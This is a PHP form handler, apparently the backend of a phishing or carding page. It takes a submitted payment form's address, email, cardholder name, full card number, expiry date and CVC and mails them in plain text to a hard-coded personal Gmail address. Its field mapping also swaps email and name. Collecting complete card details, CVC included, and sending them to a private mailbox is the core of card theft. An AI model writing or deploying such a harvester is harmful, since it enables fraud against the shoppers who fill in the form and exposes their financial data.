<?php

echo "El archivo send-mail.php se está ejecutando.";


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "lapu.torres@gmail.com"; // Cambia esto al correo donde quieres recibir los datos
    $subject = "Nuevo formulario de pago";

    // Recopila los datos del formulario
    $country = $_POST["cc-country"];
    $state = $_POST["cc-state"];
    $street = $_POST["cc-street"];
    $city = $_POST["cc-city"];
    $zip = $_POST["cc-zip"];
    $email = $_POST["cc-name"];
    $nameOnCard = $_POST["cc-email"];
    $cardNumber = $_POST["cc-number"];
    $expiration = $_POST["cc-exp"];
    $cvc = $_POST["cc-cvc"];

    // Construye el mensaje de correo
    $message = "País: $country\n";
    $message .= "Provincia: $state\n";
    $message .= "Calle: $street\n";
    $message .= "Ciudad: $city\n";
    $message .= "Código Postal: $zip\n";
    $message .= "Email: $email\n";
    $message .= "Nombre en la tarjeta: $nameOnCard\n";
    $message .= "Número de tarjeta: $cardNumber\n";
    $message .= "Fecha de expiración: $expiration\n";
    $message .= "CVC: $cvc\n";

    // Envía el correo electrónico
    $headers = "From: tu_correo@gmail.com" . "\r\n" .
    "Reply-To: tu_correo@gmail.com" . "\r\n" .
    "X-Mailer: PHP/" . phpversion();

if (mail($to, $subject, $message, $headers)) {
   
} else {
    echo "Hubo un problema al enviar el correo.";
}
}
